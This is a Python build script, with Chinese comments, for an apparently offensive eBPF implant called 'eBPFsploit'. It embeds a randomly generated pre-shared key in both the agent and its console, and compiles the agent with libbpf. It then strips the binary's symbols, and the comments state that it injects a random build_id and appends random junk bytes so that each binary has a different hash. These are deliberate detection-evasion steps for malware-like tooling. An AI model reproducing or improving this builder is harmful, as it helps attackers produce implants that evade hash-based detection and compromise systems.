#!/usr/bin/env python3
"""
eBPFsploit 一体化构建脚本
========================
功能：
  1. 生成随机 UUID 作为 Pre-Shared Key (PSK)
  2. 将 PSK 硬编码到 agent.c 和 console.py
  3. 注入随机 build_id 改变二进制 Hash
  4. 编译 Agent 并去除符号表
  5. 在二进制末尾追加随机垃圾数据

用法：
  python3 builder.py                  # 从 agent/ 目录运行
  python3 agent/builder.py            # 从项目根目录运行（Makefile 使用此方式）
"""

import os
import sys
import uuid
import random
import string
import re

# 路径自适应：支持从项目根目录或 agent/ 目录运行
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
AGENT_SRC = os.path.join(SCRIPT_DIR, "agent.c")
AGENT_BIN = os.path.join(SCRIPT_DIR, "agent")
CONSOLE_SRC = os.path.join(PROJECT_ROOT, "console", "console.py")
TEMP_BUILD = os.path.join(SCRIPT_DIR, "temp_build.c")

PSK_PLACEHOLDER = "__EBPFSPLOIT_PSK__"
# 匹配占位符或已替换的 UUID（兼容重复构建）
PSK_PATTERN = re.compile(
    r'(?:__EBPFSPLOIT_PSK__|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})'
)


def generate_junk(n=32):
    return ''.join(random.choices(string.ascii_letters, k=n))


def generate_psk():
    return str(uuid.uuid4())


def patch_psk_in_file(filepath, psk, in_place=False):
    """替换文件中的 PSK 占位符（或旧 UUID）为新 PSK"""
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    new_content = PSK_PATTERN.sub(psk, content)

    if in_place:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(new_content)
    return new_content


def restore_psk_in_file(filepath):
    """恢复文件中的 PSK 为占位符（用于 clean）"""
    with open(filepath, "r", encoding="utf-8") as f:
        content = f.read()

    new_content = PSK_PATTERN.sub(PSK_PLACEHOLDER, content)

    with open(filepath, "w", encoding="utf-8") as f:
        f.write(new_content)


def build_agent(psk):
    """构建唯一的 Agent 二进制"""
    # 1. 读取 agent.c 并替换 PSK
    patched_code = patch_psk_in_file(AGENT_SRC, psk, in_place=False)

    # 2. 注入随机 build_id 改变 Hash
    junk_str = f'\nconst char *build_id = "{generate_junk(32)}";\n'
    patched_code = patched_code.replace("int main", junk_str + "int main")

    # 3. 写入临时文件
    with open(TEMP_BUILD, "w", encoding="utf-8") as f:
        f.write(patched_code)

    # 4. 编译
    print("[*] Compiling Agent with embedded PSK...")
    ret = os.system(f"gcc -O2 {TEMP_BUILD} -o {AGENT_BIN} -lbpf -lelf -lz")
    if ret != 0:
        print("[-] Compilation failed!")
        os.remove(TEMP_BUILD)
        sys.exit(1)

    # 5. 去除符号表
    os.system(f"strip -s {AGENT_BIN}")

    # 6. 追加随机垃圾数据
    with open(AGENT_BIN, "ab") as f:
        f.write(os.urandom(random.randint(16, 64)))

    # 7. 清理临时文件
    os.remove(TEMP_BUILD)


def build():
    psk = generate_psk()

    print(f"[+] Generated PSK: {psk}")
    print()

    # 构建 Agent（使用临时文件，不修改源码）
    build_agent(psk)
    print(f"[+] Agent built: {AGENT_BIN}")

    # 将 PSK 写入 console.py（原地修改）
    patch_psk_in_file(CONSOLE_SRC, psk, in_place=True)
    print(f"[+] PSK injected into: {CONSOLE_SRC}")

    print()
    print(f"[+] Build complete. Agent and Console share the same PSK.")
    print(f"    PSK = {psk}")


def clean():
    """恢复 console.py 中的 PSK 为占位符"""
    if os.path.exists(CONSOLE_SRC):
        restore_psk_in_file(CONSOLE_SRC)
        print(f"[+] Restored PSK placeholder in {CONSOLE_SRC}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "clean":
        clean()
    else:
        build()
